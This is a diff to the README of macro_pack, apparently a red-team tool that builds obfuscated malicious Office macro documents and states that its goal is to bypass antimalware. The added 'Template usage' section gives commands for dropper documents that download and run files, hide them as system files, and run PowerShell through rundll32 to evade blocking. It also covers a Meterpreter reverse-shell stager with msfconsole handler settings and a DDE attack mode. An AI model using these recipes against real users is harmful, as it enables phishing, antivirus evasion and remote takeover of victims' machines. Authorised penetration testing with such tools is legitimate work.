@@ -4,8 +4,8 @@
 
 ## Short description
 
-The macro\_pack is a tool used to automatize obfuscation and generation of MS Office documents for pentest, demo,  and social engineering assessments.
-The goal of macro\_pack is to simplify antimalware solutions bypass and automatize the process from vba generation to final Office document generation.
+The macro\_pack is a tool used to automatize obfuscation and generation of MS Office documents for pentest, demo,  and social engineering assessments.  
+The goal of macro\_pack is to simplify antimalware solutions bypass and automatize the process from vba generation to final Office document generation.  
 It is very simple to use:
 * No configuration
 * Everything can be done using a single line of code
@@ -151,29 +151,24 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba |  macr
 
 ### General options:
 ```
-    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option. 
-          If no input file is provided, input must be passed via stdin (using a pipe).
-    -q, --quiet     Do not display anything on screen, just process request. 
-    -o, --obfuscate Obfuscate macro Destroy document readability by changing form,names, and strings
-                    Same as '--obfuscate-form --obfuscate-names --obfuscate-strings'
-    --obfuscate-form  Modify readability by removing all spaces and comments in VBA
-    --obfuscate-strings  Randomly split strings and encode them
-    --obfuscate-names Change functions, variables, and constants names  
+    -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
+        If no input file is provided, input must be passed via stdin (using a pipe).
+        
+    -q, --quiet \tDo not display anything on screen, just process request. 
+    
+    -o, --obfuscate \tSame as '--obfuscate-form --obfuscate-names --obfuscate-strings'
+    --obfuscate-form\tModify readability by removing all spaces and comments in VBA
+    --obfuscate-strings\tRandomly split strings and encode them
+    --obfuscate-names \tChange functions, variables, and constants names
+      
     -s, --start-function=START_FUNCTION   Entry point of macro file 
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
-    -t, --template=TEMPLATE_NAME 
-        Available templates:
-        	HELLO   -> Just print a hello message and awareness about macro
-                    -> Example use: echo "@Author" | %s -t HELLO -P hello.pptm
-            DROPPER -> Download and exec file
-                    -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -x dropper.xls
-            DROPPER2 -> Download and exec file. File attributes are also set to system, readonly, and hidden
-                    -> Example use:  echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -X dropper.xlsm
-            DROPPER_PS -> Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe)
-                    -> Example use:  echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -w powpow.doc
-                    Note: This payload will download PowerShdll dll from Github.
-    -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path.
-    -h, --help   Displays help and exit
+        
+    -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
+        Available templates are: HELLO, DROPPER, DROPPER2, DROPPER_PS, METERPRETER 
+        Help for template usage: macro_pack.exe -t help
+         
+    -v, --vba-output=VBA_FILE_PATH Output generated vba macro (text format) to given path. 
   Notes:
     If no output file is provided, the result will be displayed on stdout.
     Combine this with -q option to pipe only processed result into another program
@@ -202,10 +197,60 @@ MS Office document generation requires to be running on Windows machine with gen
     -x, --excel97-output=EXCEL_FILE_PATH Generates MS Excel 97-2003 (*.xls) file containing the macro.
     -W, --word-output=WORD_FILE_PATH     Generates MS Word (.docm) file containing the macro.
     -w, --word97-output=WORD_FILE_PATH   Generates MS Word 97-2003 (.doc) file containing the macro.
-    -P --ppt-output=PPT_FILE_PATH        Generates MS PowerPoint (.pptm) file.
+    -P, --ppt-output=PPT_FILE_PATH        Generates MS PowerPoint (.pptm) file.
     --dde   Dynamic Data Exchange attack mode. Input will be inserted as a cmd command and executed via DDE
      DDE attack mode is not compatible with VBA Macro related options.
 ```
+
+## Template usage
+  
+Templates can be called using  -t, --template=TEMPLATE_NAME combined with other options.  
+Here are all the available templates.
+
+            
+### HELLO  
+Just print a hello message and awareness about macro  
+Give this template the name or email of the author   
+  -> Example: ```echo "@Author" | macro_pack.exe -t HELLO -P hello.pptm```
+  
+            
+### DROPPER
+Download and execute a file.  
+Give this template the file url and the target file path  
+  -> Example:  ```echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER -o -x dropper.xls```
+  
+        
+### DROPPER2
+Download and execute a file. File attributes are also set to system, read-only, and hidden.  
+Give this template the file url and the target file path.  
+  -> Example:  ```echo <file_to_drop_url> "<download_path>" | macro_pack.exe -t DROPPER2 -o -X dropper.xlsm```
+   
+        
+### DROPPER_PS
+Download and execute Powershell script using rundll32 (to bypass blocked powershell.exe).  
+Note: This payload will download PowerShdll from Github.  
+Give this template the url of the powershell script you want to run  
+ -> Example:  ```echo "<powershell_script_url>" | macro_pack.exe -t DROPPER_PS -o -w powpow.doc```
+  
+        
+### METERPRETER  
+Meterpreter reverse TCP template using MacroMeter by Cn33liz.  
+This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw.  
+Give this template the IP and PORT of listening mfsconsole  
+ -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -W meter.docm``` 
+ 
+Recommended msfconsole options (use exploit/multi/handler):
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+set AutoRunScript post/windows/manage/migrate/smart_migrate
+set EXITFUNC thread
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+set ExitOnSession false
+```
+
+Warning: This is a 32 bit meterpreter so it will crash Office if Office 64bit is installed!
+  
 
 
 ## Efficiency
@@ -240,6 +285,7 @@ Blog post about MS Office security:
  - https://github.com/EmpireProject/Empire
  - https://medium.com/@vivami/phishing-between-the-app-whitelists-1b7dcdab4279
  - https://www.metasploit.com/
+ - https://github.com/Cn33liz/MacroMeter
  
 
 ## Contact
